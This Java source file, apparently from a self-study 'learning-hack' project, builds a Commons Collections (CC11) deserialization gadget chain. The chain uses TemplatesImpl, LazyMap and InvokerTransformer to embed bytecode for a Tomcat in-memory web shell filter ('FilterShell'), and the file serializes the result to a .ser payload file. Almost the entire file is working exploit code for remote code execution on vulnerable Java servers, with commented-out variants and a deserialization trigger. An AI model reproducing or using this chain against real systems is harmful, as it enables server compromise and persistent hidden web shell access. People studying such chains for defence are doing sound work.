import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;

@SuppressWarnings("all")
public class CC11Template {

    public static void main(String[] args) throws Exception {
        byte[] bytes = getBytes();
        byte[][] targetByteCodes = new byte[][]{bytes};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();

        Field f0 = templates.getClass().getDeclaredField("_bytecodes");
        f0.setAccessible(true);
        f0.set(templates,targetByteCodes);

        f0 = templates.getClass().getDeclaredField("_name");
        f0.setAccessible(true);
        f0.set(templates,"name");

        f0 = templates.getClass().getDeclaredField("_class");
        f0.setAccessible(true);
        f0.set(templates,null);

        // 利用反射调用 templates 中的 newTransformer 方法
        InvokerTransformer transformer = new InvokerTransformer("asdfasdfasdf", new Class[0], new Object[0]);
        HashMap innermap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap,transformer);
        TiedMapEntry tiedmap = new TiedMapEntry(map,templates);
        HashSet hashset = new HashSet(1);
        hashset.add("foo");
        // 我们要设置 HashSet 的 map 为我们的 HashMap
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        f.setAccessible(true);
        HashMap hashset_map = (HashMap) f.get(hashset);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        f2.setAccessible(true);
        Object[] array = (Object[])f2.get(hashset_map);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }
        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        keyField.setAccessible(true);
        keyField.set(node,tiedmap);

        // 在 invoke 之后，
        Field f3 = transformer.getClass().getDeclaredField("iMethodName");
        f3.setAccessible(true);
        f3.set(transformer,"newTransformer");

        try{
          //ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc11Step1.ser"));
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("learning-hack/hack-apache/hack-tomcat/memory-uses/web/WEB-INF/serializedfiles/ccfilter.ser"));
            outputStream.writeObject(hashset);
            outputStream.close();

        }catch(Exception e){
            e.printStackTrace();
        }

//        final String evalFile = "/Volumes/ONETSSD/IdeaProjects/learning-anything/learning-hack/hack-apache/hack-tomcat/memory-uses/web/WEB-INF/serializedfiles/ccfilter.ser";
//
//        try {
//            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(evalFile));
//            inputStream.readObject();
//
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
    }

    public static byte[] getBytes() throws IOException {
      //    第一次
//        InputStream inputStream = new FileInputStream(new File("./TomcatEcho.class"));
      //  第二次  
//      InputStream inputStream = new FileInputStream(new File("./TomcatInject.class"));
        InputStream inputStream = new FileInputStream(new File("/Volumes/ONETSSD/IdeaProjects/learning-anything/learning-hack/hack-apache/hack-tomcat/memory-uses/target/classes/FilterShell.class"));

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        int n = 0;
        while ((n=inputStream.read())!=-1){
            byteArrayOutputStream.write(n);
        }
        byte[] bytes = byteArrayOutputStream.toByteArray();
        return bytes;
    }
}